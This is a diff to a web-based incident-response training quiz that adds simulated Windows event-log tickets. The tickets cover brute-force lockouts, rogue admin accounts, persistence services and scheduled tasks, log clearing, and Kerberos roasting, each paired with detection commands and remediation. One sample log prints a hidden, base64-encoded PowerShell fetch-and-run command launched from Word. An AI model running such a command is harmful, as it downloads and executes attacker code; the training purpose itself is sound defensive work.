@@ -3,15 +3,15 @@
 <head>
 <meta charset="utf-8">
 <!-- tool4that:head -->
-<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'sha256-XuHSeFT2LliYygK7R9SdkI+73RBYBDz3YycuEOk4Ddg=' 'sha256-Y6i7l++8BCttoyKa0+pQRbq577gmHYWsLv6yDL1NRSg='; style-src 'unsafe-inline'; img-src data:; font-src data:; base-uri 'none'; form-action 'none'">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'sha256-1oR5pJ101vQ/qNdP7xL8IvQGzq11uQTiffopVJdbARg=' 'sha256-wGbhNCZFEQeV9OXrE6mTBwbKQnY9tjZ1hP0gSOVlIX4='; style-src 'unsafe-inline'; img-src data:; font-src data:; base-uri 'none'; form-action 'none'">
 <meta name="referrer" content="no-referrer">
-<meta name="description" content="Study the complaint and real device output, then pick the root cause. Every ticket ends with the fix and the configuration habits that prevent it.">
+<meta name="description" content="Study the complaint and real device output, then pick the root cause; every ticket ends with the fix. Log tickets add Windows, Linux, and Cisco logs: name what happened, then pick the command that surfaces it.">
 <link rel="canonical" href="https://freeapp4that.store/net-drills/trouble-tickets/">
 <link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20viewBox%3D%270%200%20100%20100%27%3E%3Ctext%20y%3D%27.9em%27%20font-size%3D%2790%27%3E%F0%9F%9B%A0%EF%B8%8F%3C%2Ftext%3E%3C%2Fsvg%3E">
 <meta property="og:type" content="website">
 <meta property="og:site_name" content="Tool4That">
 <meta property="og:title" content="Trouble Tickets">
-<meta property="og:description" content="Study the complaint and real device output, then pick the root cause. Every ticket ends with the fix and the configuration habits that prevent it.">
+<meta property="og:description" content="Study the complaint and real device output, then pick the root cause; every ticket ends with the fix. Log tickets add Windows, Linux, and Cisco logs: name what happened, then pick the command that surfaces it.">
 <meta property="og:url" content="https://freeapp4that.store/net-drills/trouble-tickets/">
 <meta property="og:image" content="https://freeapp4that.store/og-image.png">
 <meta name="twitter:card" content="summary_large_image">
@@ -76,9 +76,13 @@ fieldset.topics legend{font-size:14px;color:var(--muted);padding:0;margin-bottom
 .sym{margin:0 0 14px;padding:0 0 0 14px;border-left:3px solid var(--rule);font-size:17px;max-width:62ch}
 .evl{margin:12px 0 4px;font-size:13.5px;font-weight:600;color:var(--muted)}
 .ev{margin:0;padding:12px 14px;background:var(--scr);color:var(--sink);border-radius:8px;font:13px/1.5 var(--mono);white-space:pre;overflow-x:auto;-webkit-overflow-scrolling:touch}
-.opts{border:0;padding:0;margin:18px 0 0;display:grid;gap:8px}
+.opts{border:0;padding:0;margin:18px 0 0;display:grid;gap:8px;min-width:0}
+.opts[hidden]{display:none}
 .opts legend{font:700 18px/1.2 var(--head);padding:0;margin-bottom:10px}
-.opt{display:grid;grid-template-columns:28px 1fr;gap:10px;align-items:start;width:100%;padding:11px 12px;text-align:left;border:1.5px solid var(--rule);border-radius:8px;background:var(--bg);color:var(--ink);font-size:15.5px}
+.opt.cmd>span:last-child{font:14px/1.45 var(--mono);overflow-wrap:anywhere}
+.modes{display:flex;flex-wrap:wrap;gap:8px;margin:18px 0 0}
+fieldset.topics.grades{margin-top:0}
+.opt{display:grid;grid-template-columns:28px minmax(0,1fr);gap:10px;align-items:start;width:100%;padding:11px 12px;text-align:left;border:1.5px solid var(--rule);border-radius:8px;background:var(--bg);color:var(--ink);font-size:15.5px}
 .opt .k{display:grid;place-items:center;width:26px;height:26px;border-radius:6px;border:1.5px solid var(--rule);font:700 14px/1 var(--head);color:var(--muted)}
 .opt:not(:disabled):hover{border-color:var(--accent)}
 .opt.right{border-color:var(--ok);box-shadow:inset 4px 0 0 var(--ok)}
@@ -100,7 +104,7 @@ fieldset.topics legend{font-size:14px;color:var(--muted);padding:0;margin-bottom
 .end h2{margin:0 0 6px;font:700 28px/1.1 var(--head)}
 .end ul{margin:8px 0 0;padding-left:20px}
 footer{margin-top:40px;font-size:13px;color:var(--muted)}
-.res .picked{margin:.5rem 0;padding:.5rem .7rem;border-left:3px solid currentColor;opacity:.92}
+.res .picked{margin:.5rem 0;padding:.5rem .7rem;border-left:3px solid currentColor;opacity:.92;overflow-wrap:anywhere}
 .end .later{opacity:.85;font-size:.95em}
 
 /* reading support (panel review): text size, support bar, terms panel, banner, contrast, forced colours, print */
@@ -116,7 +120,7 @@ footer{margin-top:40px;font-size:13px;color:var(--muted)}
 .sharebar button{font:inherit;font-size:.85rem;padding:.25rem .7rem;border-radius:6px;border:1px solid var(--line,var(--rule,#8a97a5));background:var(--panel,var(--face,#fff));color:var(--ink);cursor:pointer}
 @media (prefers-contrast:more){:root{--line:currentColor;--rule:currentColor}button,.btn,.opts button,.list button,.chk,.card,.ticket{border:1px solid currentColor}}
 @media (forced-colors:active){button,.btn,.opts button,.list button{border:1px solid ButtonText}.bar2 i,.fill{background:Highlight}}
-@media print{.sbar,.termsbox,.sharebar,header .levels,header .modes,header .theme,nav.series,aside.report,footer,.nav,button{display:none !important}.wrap{display:block}.list{flex-direction:column}.list button{display:grid !important;border:none}#view,.learn{display:block}body{background:#fff;color:#000}}
+@media print{.sbar,.termsbox,.sharebar,header .levels,header .modes,header .theme,nav.series,aside.report,footer,.nav,button,fieldset.topics,.keys,.swipe{display:none !important}.ev{white-space:pre-wrap;overflow-wrap:anywhere}.wrap{display:block}.list{flex-direction:column}.list button{display:grid !important;border:none}#view,.learn{display:block}body{background:#fff;color:#000}}
 </style>
 <style>a.jack{color:inherit;text-decoration:none}a.jack:hover,a.jack:focus-visible{color:var(--ink);text-decoration:underline;text-underline-offset:3px}</style>
 </head>
@@ -130,13 +134,18 @@ footer{margin-top:40px;font-size:13px;color:var(--muted)}
     <span class="jack on" style="--c:var(--brown)" aria-current="page">Trouble Tickets</span>
   </p>
   <h1>Trouble Tickets</h1>
-  <p class="lede">Read the complaint, study the real device output, and pick the root cause. Every ticket ends with the fix, including the ones where everything works yet the config still differs from the plan.</p>
+  <p class="lede" id="lede">Read the complaint, study the real device output, and pick the root cause. Every ticket ends with the fix, including the ones where everything works yet the config still differs from the plan.</p>
+  <div class="modes" role="group" aria-label="Ticket mode"><button type="button" class="chip" id="m-net" aria-pressed="true">Network tickets</button><button type="button" class="chip" id="m-logs" aria-pressed="false">Log tickets</button></div>
 </header>
 <div class="sbar" role="toolbar" aria-label="Reading support"><button type="button" id="sbTheme">Theme: auto</button><button type="button" id="sbText">Text: Default</button><button type="button" id="sbRead">Read aloud</button><button type="button" id="sbTerms" aria-controls="termsbox">Terms</button></div>
 
 <fieldset class="topics">
   <legend>Ticket types in the deck</legend>
   <div class="chips" id="chips"></div>
+</fieldset>
+<fieldset class="topics grades">
+  <legend>Grades in the deck</legend>
+  <div class="chips" id="gchips"></div>
 </fieldset>
 
 <dl class="stats">
@@ -154,13 +163,15 @@ footer{margin-top:40px;font-size:13px;color:var(--muted)}
   <div id="t-ev"></div>
   <fieldset class="opts" id="t-opts"><legend>What's the most likely cause?</legend></fieldset>
   <div class="res" id="t-res" hidden></div>
+  <fieldset class="opts" id="t-opts2" tabindex="-1" hidden><legend>Step 2 of 2: which command surfaces it on this system?</legend></fieldset>
+  <div class="res" id="t-res2" hidden></div>
   <div class="actions"><button class="btn primary" type="button" id="t-next" hidden>Next ticket</button></div>
   <p class="keys">Keyboard: press 1 to 4 to answer, Enter for the next ticket.</p>
 </article>
 
 <section class="ticket end" id="end" hidden aria-live="polite"></section>
 
-<footer>Unofficial training, independent of and unendorsed by the makers of the systems it names. Device outputs and some PC outputs are modeled on Cisco IOS and the free Cisco Packet Tracer simulator, and the other PC and server outputs on Windows 11, Windows Server 2025, Ubuntu 24.04, and Linux Mint 22. Your best streak stays in this browser only.</footer>
+<footer>Unofficial training, independent of and unendorsed by the makers of the systems it names. Device outputs and some PC outputs are modeled on Cisco IOS and the free Cisco Packet Tracer simulator, and the other PC, server, and log outputs on Windows 11, Windows Server 2025, Ubuntu 24.04, Debian 13, and Linux Mint 22. Your chosen mode and best streaks stay in this browser only.</footer>
 </div>
 
 <script>
@@ -1100,29 +1111,570 @@ const OPTWHY = {
   ]
 };
 
+/* Log tickets: step 1 names what happened (opts, whys), step 2 picks the command that surfaces it (cmd, cwhys).
+   The first entry of opts and of cmd is the answer; whys and cwhys explain entries 1 to 3. Router and switch clocks run in UTC; Hawaiʻi is UTC−10. */
+const LOGS = [
+{ id: 'lg-lockout', cat: 'Windows logs', title: 'Locked out at 2 AM',
+  sym: "The overnight report shows pua's domain account locked out at 2:11 AM, after failed sign-ins on PHN-LAB-07. She teaches in that lab and was home asleep.",
+  ev: [['PHN-LAB-07 Event Viewer, Security log (newest first, trimmed)', `Keywords       Date and Time            Event ID  Task Category
+Audit Failure  11/23/2026 2:11:09 AM    4625      Logon
+Audit Failure  11/23/2026 2:11:07 AM    4625      Logon
+Audit Failure  11/23/2026 2:11:05 AM    4625      Logon
+Audit Failure  11/23/2026 2:11:04 AM    4625      Logon
+Audit Failure  11/23/2026 2:11:03 AM    4625      Logon
+Audit Success  11/20/2026 3:02:17 PM    4634      Logoff`],
+    ['One of the 4625 events, General tab (trimmed)', `An account failed to log on.
+Logon Type:                3
+Account For Which Logon Failed:
+   Account Name:           pua
+   Account Domain:         PHN
+Failure Information:
+   Status:                 0xC000006D
+   Sub Status:             0xC000006A
+Network Information:
+   Workstation Name:       LAB-SPARE
+   Source Network Address: 10.1.10.64`],
+    ['PHN-DC-01 Security log, 4740 at 2:11:09 AM (trimmed)', `A user account was locked out.
+Account That Was Locked Out:
+   Account Name:          pua
+Additional Information:
+   Caller Computer Name:  LAB-SPARE`]],
+  opts: ["Someone at 10.1.10.64 guessed pua's password over the network until the domain locked the account", 'pua mistyped her password at the keyboard', 'A password spray tried one password on many accounts', 'Audit policy stopped recording her sign-ins'],
+  whys: ['A keyboard sign-in logs Logon Type 2 while she sits at the PC. These are type 3, over the network, five in six seconds at 2:11 AM.',
+    'A spray tries many names about once each and stays under the lockout. This run hits one account until 4740 locks it.',
+    'PHN-LAB-07 logged every failure and PHN-DC-01 logged the lockout, so audit policy records both.'],
+  why: "Five 4625s in six seconds, all type 3 with Sub Status 0xC000006A (a real account, wrong password), end in 4740: many keys on one door, a brute-force run. pua's account lives in the domain, so the PC logs the failures and the domain controller logs the lockout. Weigh the Source Network Address, 10.1.10.64 in the Site A Students VLAN, over Workstation Name, which the sender picks.",
+  q2: 'Step 2 of 2: which command surfaces the guessing on PHN-LAB-07?',
+  cmd: ["Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 20", "Get-WinEvent -FilterHashtable @{LogName='System'; Id=4625} -MaxEvents 20", "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 20", 'auditpol /get /category:*'],
+  cwhy: 'Failed sign-ins are 4625 in the Security log. Run it from an elevated prompt.',
+  cwhys: ['4625 lives in the Security log, so a System query comes back empty.', '4624 lists sign-ins that worked, and every try here failed.', 'auditpol shows what audit policy records; the events themselves live in the Security log.'],
+  fix: 'Trace 10.1.10.64: from a PC in the Students VLAN, ping it, and arp -a gives its MAC address; on SwA, show mac address-table names the port that MAC uses. Find who used that machine at 2:11 AM.\nKeep the lockout threshold: it stopped the guessing. pua sets a new password.' },
+{ id: 'lg-newadmin', cat: 'Windows logs', title: 'An admin outside the change log',
+  sym: 'The weekly baseline check lists a local administrator named helpdesk on PHN-LAB-07, and the change log holds zero requests for it.',
+  ev: [['PHN-LAB-07 Event Viewer, Security log (newest first, trimmed)', `Keywords       Date and Time             Event ID  Task Category
+Audit Success  11/20/2026 11:48:22 PM    4732      Security Group Management
+Audit Success  11/20/2026 11:48:22 PM    4720      User Account Management
+Audit Success  11/20/2026 11:47:58 PM    4672      Special Logon
+Audit Success  11/20/2026 11:47:58 PM    4624      Logon
+Audit Success  11/20/2026 3:02:17 PM     4634      Logoff`],
+    ['The 4732 event, General tab (trimmed)', `A member was added to a security-enabled local group.
+Subject:
+   Account Name:     Administrator
+   Account Domain:   PHN-LAB-07
+Member:
+   Security ID:      PHN-LAB-07\\helpdesk
+Group:
+   Group Name:       Administrators
+   Group Domain:     Builtin`]],
+  opts: ['The Administrator account created helpdesk at 11:48 PM and added it to Administrators: an unapproved admin', 'Windows Update created helpdesk as a service account', 'helpdesk already existed, and someone reset its password', 'helpdesk joined only Remote Desktop Users'],
+  whys: ['Updates leave local accounts alone, and the Subject in the 4732 is the Administrator account.',
+    '4720 records a brand-new account, created at 11:48 PM.',
+    'The 4732 names the group: Administrators, in the Builtin domain.'],
+  why: '4720 (account created) and 4732 (added to a local group) land in the same second, just after a 4624 and its 4672 admin-level sign-in. The change log lists zero approvals for it, and an extra admin account is a classic way for an intruder to stay in.',
+  cmd: ["Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4732}", "Get-WinEvent -FilterHashtable @{LogName='System'; Id=4732}", "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4726}", 'Get-LocalUser | Select-Object Name,Enabled'],
+  cwhy: 'Group additions are 4732 in the Security log, the same filter shape as 4720 for new accounts.',
+  cwhys: ['Account and group changes go to the Security log; the System log holds service installs such as 7045.', '4726 records a deleted account, and helpdesk was created.', "Get-LocalUser lists today's accounts, without who made helpdesk or when."],
+  fix: 'Disable it now and keep the events as evidence:\nDisable-LocalUser -Name helpdesk\nRemove-LocalGroupMember -Group Administrators -Member helpdesk\nThe 4624 at 11:47 PM names where the Administrator sign-in came from: change that password and follow the lead.' },
+{ id: 'lg-service', cat: 'Windows logs', title: 'A service missing from the image',
+  sym: 'PHN-LAB-12 was reimaged Friday. Today it runs a service called PrintSpoolHelper, a name missing from our lab image.',
+  ev: [['PHN-LAB-12 Event Viewer, System log (newest first, trimmed)', `Level         Date and Time            Source                     Event ID
+Information   11/23/2026 1:02:44 AM    Service Control Manager    7036
+Information   11/23/2026 1:02:44 AM    Service Control Manager    7045
+Information   11/23/2026 12:58:10 AM   Service Control Manager    7036
+Information   11/22/2026 6:00:03 PM    EventLog                   6013`],
+    ['The 7045 event, General tab', `A service was installed in the system.
+
+Service Name:  PrintSpoolHelper
+Service File Name:  C:\\Users\\Public\\psh.exe
+Service Type:  user mode service
+Service Start Type:  auto start
+Service Account:  LocalSystem`]],
+  opts: ['A new auto-start service runs psh.exe from C:\\Users\\Public as LocalSystem: persistence', 'The Print Spooler updated itself', 'A teacher installed a printer driver', 'A service crashed and restarted'],
+  whys: ["Windows' own spooler is the Spooler service, running spoolsv.exe from System32. This file sits in C:\\Users\\Public, a folder every user can write.",
+    'A printer driver installs into the Windows folder. This entry adds a service that runs an .exe from a shared user folder.',
+    '7036 records a service changing state; 7045 means this service is brand-new.'],
+  why: "7045 records a new service. This one starts at every boot (auto start) as LocalSystem, the most powerful local account, and runs a program from a folder any user can write, under a name that borrows the trusted Print Spooler's.",
+  cmd: ["Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} -MaxEvents 20", "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=7045} -MaxEvents 20", 'Get-Service | Where-Object Status -eq Running', "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4720} -MaxEvents 20"],
+  cwhy: 'Service installs are 7045, in the System log, so name that log.',
+  cwhys: ['7045 lives in the System log, so a Security query comes back empty.', 'It lists the services running now, without when each arrived or who added it.', '4720 records new user accounts, and this change added a service.'],
+  fix: 'Record the hash, then stop and remove the service:\nGet-FileHash C:\\Users\\Public\\psh.exe\nsc.exe stop PrintSpoolHelper\nsc.exe delete PrintSpoolHelper\nThen treat PHN-LAB-12 as compromised: find who signed in before 1:02 AM, and reimage it.' },
+{ id: 'lg-logclear', cat: 'Windows logs', title: 'The Security log holds two events',
+  sym: "The log server raised an alert for PHN-LAB-07 at 2:15 AM. This morning the PC's Security log holds two events.",
+  ev: [['PHN-LAB-07 Event Viewer, Security log (all of it)', `Keywords       Date and Time           Event ID  Task Category
+Audit Success  11/23/2026 7:31:02 AM   4624      Logon
+Audit Success  11/23/2026 2:15:41 AM   1102      Log clear`],
+    ['The 1102 event, General tab', `The audit log was cleared.
+Subject:
+   Security ID:     PHN-LAB-07\\Administrator
+   Account Name:    Administrator
+   Domain Name:     PHN-LAB-07
+   Logon ID:        0x2A41F`],
+    ['Log server: events forwarded from PHN-LAB-07 (UTC)', `2026-11-23T12:09:52Z  4624  Logon Type 10  Administrator  from 203.0.113.50
+2026-11-23T12:09:52Z  4672  Administrator
+2026-11-23T12:15:41Z  1102  Administrator`]],
+  opts: ['Someone signed in as Administrator by Remote Desktop from an outside address, then cleared the Security log', 'The Security log filled up and rolled over', 'A Windows update reset the event logs', 'Audit policy was turned off overnight'],
+  whys: ['A full log set to overwrite drops its oldest events one at a time, quietly. 1102 means someone cleared it.',
+    'Updates keep the event logs, and the 1102 names the account that cleared this one: Administrator.',
+    'Turning audit policy off stops new events and keeps the old ones in place. Here the old ones are gone, and 1102 marks the clear.'],
+  why: 'Windows writes 1102 whenever the Security log is cleared, a common way to cover tracks. The forwarded copies still hold the story: a type 10 (Remote Desktop) sign-in as Administrator from 203.0.113.50 at 2:09 AM HST, six minutes before the clear.',
+  cmd: ["Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102}", "Get-WinEvent -FilterHashtable @{LogName='System'; Id=1102}", "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4634}", 'wevtutil gl Security'],
+  cwhy: 'The clear writes 1102 as the first event in the fresh Security log.',
+  cwhys: ['1102 lives in the Security log it reports on, so a System query comes back empty.', '4634 records sessions ending, and the clear erased those.', 'wevtutil gl reads the log settings, such as maxSize, without any event.'],
+  fix: "Treat it as an incident and work from the log server's copies: change the Administrator password, close Remote Desktop to outside addresses at the edge, and check what the 2:09 AM session touched.\nKeep forwarding: it is why the story survived." },
+{ id: 'lg-task', cat: 'Windows logs', title: 'A window flashes at every sign-in',
+  sym: 'Every time pua signs in to PHN-LAB-07, a black window flashes and closes. It started Thursday.',
+  ev: [['PHN-LAB-07 Event Viewer, Security log (newest first, trimmed)', `Keywords       Date and Time            Event ID  Task Category
+Audit Success  11/19/2026 2:14:06 AM    4698      Other Object Access Events
+Audit Success  11/19/2026 2:13:51 AM    4672      Special Logon
+Audit Success  11/19/2026 2:13:51 AM    4624      Logon`],
+    ['The 4698 event, General tab (trimmed)', `A scheduled task was created.
+Subject:
+   Account Name:    adm_keola
+   Account Domain:  PHN
+Task Information:
+   Task Name:       \\Microsoft\\Windows\\OneDriveSync
+   Task Content:    …<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>…
+                    …<Actions Context="Author"><Exec><Command>C:\\Users\\Public\\sync.exe</Command></Exec></Actions>…`]],
+  opts: ["adm_keola's account created a task at 2:14 AM that runs C:\\Users\\Public\\sync.exe at every sign-in: persistence", 'A Windows task, since it sits under \\Microsoft\\Windows\\', "OneDrive syncing pua's files", 'Windows Update scheduling a restart'],
+  whys: ["The folder is a label anyone can pick. Windows' own tasks run signed programs from System32, and this one runs a file from Public.",
+    'OneDrive runs from its own install folder. This task borrows the name and runs a .exe from C:\\Users\\Public.',
+    "Update restarts run Windows' own programs. This task runs sync.exe at each sign-in: the flashing window."],
+  why: '4698 records a new scheduled task once Other Object Access Events records Success, which is off by default. This one fires at every sign-in and runs a file from a folder any user can write, under a borrowed Microsoft name, 15 seconds after an admin-level sign-in by adm_keola at 2:13 AM, outside working hours.',
+  cmd: ["Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4698}", "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-TaskScheduler/Operational'; Id=4698}", "Get-WinEvent -FilterHashtable @{LogName='System'; Id=4698}", "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688}"],
+  cwhy: 'Task creation is 4698 in the Security log.',
+  cwhys: ['The Task Scheduler log numbers its own events (106 for a task registered) and starts turned off.', 'The System log holds 7045 service installs; task creation goes to the Security log.', '4688 records each run of sync.exe and leaves out the task that keeps launching it.'],
+  fix: 'Record it, then remove the task and its file:\nGet-ScheduledTask -TaskName OneDriveSync | Format-List *\nUnregister-ScheduledTask -TaskName OneDriveSync -Confirm:$false\nThen ask why adm_keola signed in at 2:13 AM: reset that password and read its other 4624s.' },
+{ id: 'lg-office', cat: 'Windows logs', title: 'The PC slowed after a grade appeal',
+  sym: "pua opened a 'Grade appeal' document from an email on PHN-LAB-07, and the PC slowed right after.",
+  ev: [['PHN-LAB-07 Event Viewer, Security log (newest first, trimmed)', `Keywords       Date and Time             Event ID  Task Category
+Audit Success  11/23/2026 12:47:30 PM    4688      Process Creation
+Audit Success  11/23/2026 12:47:22 PM    4688      Process Creation
+Audit Success  11/23/2026 12:40:05 PM    4688      Process Creation`],
+    ['The 12:47:30 PM event, General tab (trimmed)', `A new process has been created.
+Creator Subject:
+   Account Name:          pua
+Process Information:
+   New Process Name:      C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+   Creator Process Name:  C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE
+   Process Command Line:  powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A…`]],
+  opts: ['Word started hidden PowerShell with an encoded command: the document carried malicious code', 'Word checked for updates', 'pua ran a PowerShell script for her gradebook', 'A scheduled task ran at 12:47'],
+  whys: ["Office updates run Microsoft's own updater, while -w hidden and -enc hide a window and a script.",
+    'A script she runs starts from explorer.exe or a terminal. Here WINWORD.EXE is the creator, eight seconds after the document opened.',
+    'A task starts from the Task Scheduler service. This creator is Word.'],
+  why: 'A 4688 names the new process and its creator. Word starting PowerShell is out of place, and -nop -w hidden -enc skips the profile, hides the window, and hides the script in base64. The command line appears because the Group Policy setting Include command line in process creation events is on.',
+  cmd: ["Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688}", "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4688}", "Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045}", "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624}"],
+  cwhy: 'New processes are 4688 in the Security log, each with its creator.',
+  cwhys: ['The PowerShell log holds 4104 script blocks; 4688 lives in the Security log.', '7045 records service installs, and this document started a process.', "4624 lists sign-ins, and this was a program starting inside pua's session."],
+  fix: 'Isolate PHN-LAB-07, keep the document and the events, and decode the command on another machine, as text.\nThen turn on the ASR rule that blocks Office apps from creating child processes, so the next booby-trapped document fails.' },
+{ id: 'lg-localadmin', cat: 'Windows logs', title: "The lab PC's own admin signs in from next door",
+  sym: 'The log server flags a sign-in on PHN-LAB-07 by its own local Administrator account at 1:15 PM, while the lab sat empty.',
+  ev: [['PHN-LAB-07 Security log, 4624, General tab (trimmed)', `An account was successfully logged on.
+Logon Information:
+   Logon Type:              3
+New Logon:
+   Account Name:            Administrator
+   Account Domain:          PHN-LAB-07
+Network Information:
+   Workstation Name:        PHN-LAB-12
+   Source Network Address:  10.1.10.61
+Detailed Authentication Information:
+   Authentication Package:  NTLM`]],
+  opts: ["Someone on PHN-LAB-12 signed in over the network with the lab PCs' shared local Administrator password", 'pua unlocked her screen', 'IT managed the PC over WinRM', 'Windows Update signed in as SYSTEM'],
+  whys: ["An unlock is Logon Type 7, at the keyboard, by pua's own account.",
+    "IT signs in with its domain admin account, PHN\\adm_keola, through Kerberos. This sign-in uses PHN-LAB-07's own local account by NTLM.",
+    'Services sign in as SYSTEM with Logon Type 5. This is type 3 from another workstation.'],
+  why: "Logon Type 3 means over the network, and Account Domain PHN-LAB-07 marks the PC's own local Administrator. Sent from another lab PC by NTLM, it shows one local password opens both machines: steal it once, and every lab PC follows.",
+  cmd: ["Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624}", "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625}", "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4740}", "Get-WinEvent -FilterHashtable @{LogName='System'; Id=4624}"],
+  cwhy: 'Sign-ins that worked are 4624 in the Security log; read Logon Type and Account Domain in each.',
+  cwhys: ['4625 lists failures, and this sign-in worked.', '4740 lists lockouts, and this account signed in.', '4624 lives in the Security log, so a System query comes back empty.'],
+  fix: 'Change the local Administrator password on both PCs, then turn on Windows LAPS so each machine gets its own rotating password. Check who was signed in on PHN-LAB-12 at 1:15 PM.' },
+{ id: 'lg-rdp', cat: 'Windows logs', title: 'A service account by Remote Desktop',
+  sym: 'The backup report for PHN-FS-01 looks normal, but the edge firewall shows Remote Desktop traffic from outside at 3 AM.',
+  ev: [['PHN-FS-01 Event Viewer, TerminalServices-RemoteConnectionManager/Operational', `Level        Date and Time           Event ID
+Information  11/23/2026 3:12:40 AM   1149
+
+Remote Desktop Services: User authentication succeeded:
+
+User: svc_backup
+Domain: PHN
+Source Network Address: 203.0.113.50`],
+    ['PHN-FS-01 Security log, 4624 four seconds later (trimmed)', `Logon Type:              10
+Account Name:            svc_backup
+Account Domain:          PHN
+Source Network Address:  203.0.113.50`]],
+  opts: ['svc_backup signed in by Remote Desktop from an outside address at 3:12 AM', 'The nightly backup job ran as svc_backup', 'An admin connected over the school VPN', 'A failed Remote Desktop guess'],
+  whys: ['A backup job signs in as a batch job or service (Logon Type 4 or 5) on the server itself. This is type 10, Remote Desktop, from 203.0.113.50.',
+    'A VPN user arrives from an inside address the VPN assigns, and svc_backup runs a job, while people sign in with their own accounts.',
+    '1149 says authentication succeeded, and the 4624 confirms the session.'],
+  why: '1149 records a Remote Desktop authentication that passed, and the type 10 4624 four seconds later confirms the session: one intrusion seen in two logs. A service account belongs to a job, and Remote Desktop from outside at 3 AM is a person at the keyboard.',
+  cmd: ["Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational'; Id=1149}", "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1149}", "Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045}", "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625}"],
+  cwhy: "LogName takes the names in Event Viewer's tree, and 1149 lives in this Remote Desktop log.",
+  cwhys: ['The Security log twin is the type 10 4624; 1149 lives in the Remote Desktop log.', '7045 records service installs, and this was a sign-in.', '4625 lists failures, and this sign-in passed.'],
+  fix: 'Disable svc_backup and close Remote Desktop to the internet at the edge firewall:\nDisable-ADAccount -Identity svc_backup\nThen move the backup job to a gMSA, and check what the 3:12 AM session touched.' },
+{ id: 'lg-roast', cat: 'Windows logs', title: 'A sweep of service tickets',
+  sym: "The SIEM rule for service-ticket bursts fired on pua's account at 1:41 PM.",
+  ev: [['SIEM: 4769 events from PHN-DC-01 (newest first, trimmed; 10.1.10.37 is PHN-LAB-07)', `Time (HST)   Account  Service Name  Ticket Encryption Type  Client Address
+1:41:03 PM   pua      svc_web       0x17                    ::ffff:10.1.10.37
+1:41:03 PM   pua      svc_print     0x17                    ::ffff:10.1.10.37
+1:41:02 PM   pua      svc_backup    0x17                    ::ffff:10.1.10.37
+1:41:02 PM   pua      svc_sql       0x17                    ::ffff:10.1.10.37
+             … 21 more svc_ accounts in the same minute
+1:35:10 PM   pua      PHN-FS-01$    0x12                    ::ffff:10.1.10.37`]],
+  opts: ["pua's session on PHN-LAB-07 requested RC4 tickets for 25 service accounts in a minute: Kerberoasting", 'pua reconnected her mapped drives', 'A golden ticket forged for pua', 'AS-REP roasting against pua'],
+  whys: ['A mapped drive asks for one ticket, for the file server: PHN-FS-01$ at 1:35, in AES (0x12).',
+    'A golden ticket shows as service tickets for an account missing its sign-in ticket (4768). The finding here is the burst of RC4 requests.',
+    'AS-REP roasting shows as a 4768 with Pre-Authentication Type 0. These are 4769 service tickets.'],
+  why: "Each 4769 is a service ticket encrypted with the service account's key. One account sweeping 25 services outside its daily work sends those tickets offline for password cracking. pua's mapped drive got AES (0x12) at 1:35; the sweep asked for RC4 (0x17), the cipher a cracking tool wants, and those service accounts still allow it. The burst plus the cipher are the sign.",
+  cmd: ["Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4769}", "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4768}", "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4776}", "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4771}"],
+  q2: 'Step 2 of 2: which command surfaces it on PHN-DC-01?',
+  cwhy: "Service tickets are 4769 in the DC's Security log.",
+  cwhys: ['4768 is the sign-in ticket, issued before any service is named.', '4776 records NTLM password checks, outside Kerberos.', '4771 records failed pre-authentication, and these requests all succeeded.'],
+  fix: "Isolate PHN-LAB-07 and reset pua's password. Then move each service account to a gMSA or a long random password, so a cracked ticket stays out of reach, and retire RC4 for Kerberos." },
+{ id: 'lg-asrep', cat: 'Windows logs', title: 'One account skips a step',
+  sym: 'The SIEM flags a sign-in ticket for svc_print, requested from a lab PC.',
+  ev: [['SIEM: 4768 events from PHN-DC-01 (newest first, trimmed; 10.1.10.61 is PHN-LAB-12)', `Time (HST)   Account    Pre-Authentication Type  Client Address
+1:52:18 PM   svc_print  0                        ::ffff:10.1.10.61
+1:50:03 PM   pua        2                        ::ffff:10.1.10.37
+1:49:41 PM   leilani    2                        ::ffff:10.1.20.30`]],
+  opts: ['svc_print skips Kerberos pre-authentication, and 10.1.10.61 asked for its reply to crack offline: AS-REP roasting', 'svc_print typed a wrong password', 'Kerberoasting of svc_print', 'An ordinary sign-in by the print service'],
+  whys: ['A wrong password fails pre-authentication with a 4771. This 4768 succeeded without any password proof.',
+    'Kerberoasting shows as a burst of 4769 service-ticket requests. This is one 4768, the sign-in ticket.',
+    'The print service runs on the print server, and this request came from a lab PC, PHN-LAB-12; every ordinary sign-in here shows type 2.'],
